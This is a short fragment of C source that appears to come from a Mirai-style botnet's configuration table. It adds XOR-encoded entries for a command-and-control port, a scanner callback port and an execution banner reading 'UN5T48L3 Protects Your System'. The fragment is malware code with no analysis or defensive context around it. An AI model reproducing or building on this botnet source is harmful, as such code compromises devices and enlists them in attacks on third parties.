...
{
    add_entry(TABLE_CNC_PORT, "\x4A\x05", 2); // 26663
    add_entry(TABLE_SCAN_CB_PORT, "\x6C\x3A", 2); // 19992
    add_entry(TABLE_EXEC_SUCCESS, "\x77\x6C\x17\x76\x16\x1A\x6E\x11\x02\x72\x50\x4D\x56\x47\x41\x56\x51\x02\x7B\x4D\x57\x50\x02\x71\x5B\x51\x56\x47\x4F\x22", 26); // UN5T48L3 Protects Your System
